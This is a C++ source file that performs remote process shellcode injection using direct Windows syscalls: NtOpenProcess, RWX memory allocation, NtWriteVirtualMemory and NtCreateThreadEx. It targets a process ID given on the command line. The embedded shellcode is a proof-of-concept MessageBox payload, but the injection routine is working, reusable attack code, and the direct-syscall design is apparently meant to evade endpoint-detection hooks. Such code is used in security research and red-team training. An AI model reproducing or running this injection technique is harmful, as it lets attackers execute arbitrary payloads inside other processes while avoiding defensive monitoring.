// ]DirectCallsCaller.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include "syscalls.h"

  // 64-bit messagebox payload (without encryption)
unsigned char my_payload[] =
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\xfe\x00\x00\x00\x3e"
"\x4c\x8d\x85\x13\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
"\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2\x56\xff"
"\xd5\x4b\x68\x61\x6c\x65\x64\x30\x78\x30\x37\x20\x69\x73"
"\x20\x48\x65\x72\x65\x21\x2e\x00\x4d\x65\x73\x73\x61\x67"
"\x65\x42\x6f\x78\x00";





    SIZE_T my_payload_len = sizeof(my_payload);
    int main(int argc, const char* argv[])
    {
        NTSTATUS status;
        HANDLE  hProcess;
        HANDLE   hThread = NULL;
        OBJECT_ATTRIBUTES   oa = { 0 };
        CLIENT_ID   cid = { 0 };
        PVOID rb; // remote buffer
        SIZE_T bytesWritten = 0;
        DWORD    PID = 0;



        PID = atoi(argv[1]);
        cid.UniqueProcess = (HANDLE)PID;

        okay("got all function syscall numbers, beginning injection...");
        info("getting a handle on the process (%ld)...", PID);
        status = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &cid);
        if (!status == STATUS_SUCCESS) {
            warn("[NtOpenProcess] failed to get a handle on the process (%ld), error: 0x%x", PID, status);
            return EXIT_FAILURE;
        }
        okay("got a handle to the process!");
        info("\\___[ hProcess\n\t\\_0x%p]\n", hProcess);

        status = NtAllocateVirtualMemory(hProcess, &rb, 0, &my_payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!status == STATUS_SUCCESS) {
            printf("[NtAllocateVirtualMemory] failed to allocate memory, error: 0x%x", status);
            return -1;
        }
        printf("allocated buffer with PAGE_EXECUTE_READWRITE [RWX] permissions! in address: 0x%11p\n", rb);
        info("writing payload to allocated buffer...");

        status = NtWriteVirtualMemory(hProcess, rb, my_payload, sizeof(my_payload), &bytesWritten);
        if (!status == STATUS_SUCCESS) {
            warn("[NtWriteVirtualMemory] failed to write to allocated buffer, error: 0x%x", status);
            return -2;
        }
        okay("wrote %zu-bytes to allocated buffer!", bytesWritten);


        info("creating thread, beginning execution");
        status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, rb, NULL, FALSE, 0, 0, 0, NULL);
        if (!status == STATUS_SUCCESS) {
            warn("[NtCreateThreadEx] failed to create thread, error: 0x%x", status);
            return -2;
        }
        okay("thread created!");

        info("waiting for thread to finish execution");
        status = NtWaitForSingleObject(hThread, FALSE, NULL);
        if (!status == STATUS_SUCCESS) {
            warn("[NtWaitForSingleObject] failed to wait for object (hThread), error: 0x%x", status);
            return -2;
        }
        okay("thread finished execution!");

        return 0;

    }
